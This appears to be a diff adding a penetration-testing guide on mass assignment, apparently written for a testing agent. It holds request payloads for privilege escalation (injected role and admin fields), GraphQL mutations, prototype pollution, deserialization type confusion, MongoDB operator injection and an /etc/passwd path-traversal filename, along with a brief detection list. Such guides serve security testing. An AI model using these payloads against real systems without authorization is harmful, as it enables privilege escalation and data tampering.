@@ -1,0 +1,264 @@
+<vulnerability_guide>
+  <title>MASS ASSIGNMENT - ADVANCED TECHNIQUES</title>
+
+  <critical>Mass assignment allows attackers to modify object properties they shouldn't access by adding extra parameters to requests. Modern frameworks and nested objects create complex attack surfaces where a single extra parameter can escalate privileges, modify billing, or bypass security controls.</critical>
+
+  <scope>
+    - Nested object mass assignment
+    - Framework-specific exploitation
+    - GraphQL mutation attacks
+    - JSON/XML parameter binding
+    - Prototype pollution via assignment
+    - Relationship manipulation
+  </scope>
+
+  <methodology>
+    1. PARAMETER DISCOVERY
+       {% raw %}
+       # Discover available parameters:
+       # - API documentation / OpenAPI specs
+       # - JavaScript source code analysis
+       # - Error messages revealing structure
+       # - Response object properties
+
+       # Response-to-request mapping
+       # If GET returns {"user": {"role": "user"}}
+       # Try PUT/PATCH with {"role": "admin"}
+
+       # Debug mode information
+       # Verbose errors may reveal model structure
+       # Stack traces show parameter binding
+
+       # GraphQL introspection
+       { __type(name: "User") { fields { name } } }
+       {% endraw %}
+
+    2. BASIC MASS ASSIGNMENT
+       {% raw %}
+       # Original request (user registration)
+       POST /api/users
+       {"username": "attacker", "email": "a@b.com"}
+
+       # Attempt privilege escalation
+       POST /api/users
+       {"username": "attacker", "email": "a@b.com", "role": "admin"}
+
+       # Common dangerous parameters:
+       # - role, admin, isAdmin, is_admin
+       # - verified, emailVerified, isVerified
+       # - balance, credits, subscription
+       # - permissions, scopes
+       # - password, passwordHash (overwrite)
+       {% endraw %}
+
+    3. NESTED OBJECT EXPLOITATION
+       {% raw %}
+       # Nested object injection
+       POST /api/users
+       {
+         "username": "attacker",
+         "profile": {
+           "role": "admin"
+         }
+       }
+
+       # Deep nesting
+       {
+         "user": {
+           "account": {
+             "permissions": {
+               "admin": true
+             }
+           }
+         }
+       }
+
+       # Array injection
+       {"roles": ["user", "admin"]}
+       {"permissions": ["read", "write", "admin"]}
+
+       # Dot notation (some frameworks)
+       {"user.role": "admin"}
+       {"profile.isAdmin": true}
+       {% endraw %}
+
+    4. RELATIONSHIP MANIPULATION
+       {% raw %}
+       # Foreign key manipulation
+       POST /api/orders
+       {"product_id": 1, "user_id": 999}  # Different user's account
+
+       # Association injection
+       POST /api/users/1
+       {"organization_id": 1}  # Join different org
+
+       # Nested relationship
+       POST /api/users
+       {
+         "username": "attacker",
+         "organization": {"id": 1}  # Existing privileged org
+       }
+
+       # Polymorphic association abuse
+       {"owner_type": "Admin", "owner_id": 1}
+       {% endraw %}
+
+    5. GRAPHQL MUTATION ATTACKS
+       {% raw %}
+       # GraphQL mutations are prime targets
+
+       mutation {
+         updateUser(id: 1, input: {
+           name: "attacker"
+           role: ADMIN  # Undocumented parameter
+         }) {
+           id
+           role
+         }
+       }
+
+       # Nested input objects
+       mutation {
+         updateUser(input: {
+           profile: {
+             permissions: {
+               canDeleteUsers: true
+             }
+           }
+         }) { id }
+       }
+
+       # Check for unvalidated inputs
+       # Introspection reveals InputType fields
+       { __type(name: "UpdateUserInput") { inputFields { name type { name } } } }
+       {% endraw %}
+    </methodology>
+
+  <advanced_techniques>
+    <framework_specific>
+      {% raw %}
+      # Ruby on Rails
+      # Strong params bypass
+      params.permit!  # Dangerous - permits everything
+      params.permit(:user => [:name, :email, :admin])  # Nested admin exposed
+
+      # Django
+      # Form/ModelSerializer fields
+      # Check for fields = '__all__' or exclude patterns
+
+      # Spring (Java)
+      # @ModelAttribute auto-binding
+      # Jackson @JsonProperty on sensitive fields
+
+      # Express.js
+      # body-parser with extended: true
+      # Allows nested object parsing
+
+      # Laravel
+      # $fillable / $guarded arrays
+      # Check for protected $guarded = []
+      {% endraw %}
+    </framework_specific>
+
+    <prototype_pollution>
+      {% raw %}
+      # JavaScript prototype pollution via mass assignment
+
+      # Payload
+      {"__proto__": {"admin": true}}
+      {"constructor": {"prototype": {"admin": true}}}
+
+      # If merged into object, pollutes prototype
+      // Vulnerable code
+      Object.assign({}, userInput);  // Pollutes Object.prototype
+
+      # Check for pollution
+      // After injection:
+      console.log({}.admin);  // true if polluted
+      {% endraw %}
+    </prototype_pollution>
+
+    <serialization_attacks>
+      {% raw %}
+      # Serializer field exposure
+
+      # JSON.NET (C#)
+      {"$type": "Admin, Assembly", ...}  # Type confusion
+
+      # Jackson (Java)
+      {"@class": "com.company.Admin", ...}
+
+      # PHP
+      # Unserialize with class instantiation
+      O:5:"Admin":1:{s:4:"role";s:5:"admin";}
+
+      # Check for:
+      # - Type hints in JSON
+      # - Polymorphic deserialization
+      # - Custom serializers
+      {% endraw %}
+    </serialization_attacks>
+
+    <database_specific>
+      {% raw %}
+      # MongoDB mass assignment
+      {"$set": {"role": "admin"}}  # Operator injection
+      {"$unset": {"password": ""}}  # Remove password requirement
+
+      # SQL ORM mass assignment
+      # Sequelize: Model.create(req.body)
+      # SQLAlchemy: User(**request.json)
+
+      # Direct column assignment
+      {"created_at": "2020-01-01"}  # Manipulate timestamps
+      {"deleted_at": null}  # Undelete records
+      {% endraw %}
+    </database_specific>
+
+    <file_upload_manipulation>
+      {% raw %}
+      # File metadata mass assignment
+
+      # Filename manipulation
+      {"filename": "../../../etc/passwd"}
+
+      # MIME type bypass
+      {"content_type": "image/png"}  # When uploading PHP
+
+      # Storage path manipulation
+      {"path": "/admin/uploads/"}
+      {"bucket": "private-bucket"}
+
+      # Associated file data
+      {"file": {"public": true}}  # Make private files public
+      {% endraw %}
+    </file_upload_manipulation>
+  </advanced_techniques>
+
+  <detection>
+    - Compare request parameters against whitelist
+    - Log unexpected parameters in requests
+    - Monitor for privilege-related field changes
+    - Alert on nested object parameter binding
+    - Track association/relationship modifications
+  </detection>
+
+  <validation>
+    - Successfully modify protected attributes
+    - Escalate privileges via mass assignment
+    - Manipulate relationships/associations
+    - Bypass business logic through parameter injection
+    - Document framework-specific vulnerabilities
+  </validation>
+
+  <pro_tips>
+    - GET responses often reveal writable fields - mirror them back in POST/PUT
+    - Debug/verbose error modes expose model structure
+    - GraphQL introspection shows input types with sensitive fields
+    - "password_confirmation" often bypassed while "password" is protected
+    - Check for both snake_case and camelCase versions of parameters
+    - Arrays and nested objects frequently bypass simple checks
+  </pro_tips>
+
+  <remember>Mass assignment is context-dependent. The "role" parameter might be protected during registration but exposed during profile updates. Test every endpoint that accepts object data. Modern nested object support and GraphQL mutations have dramatically increased the attack surface. Always enumerate all possible parameters from documentation, responses, and source code.</remember>
+</vulnerability_guide>
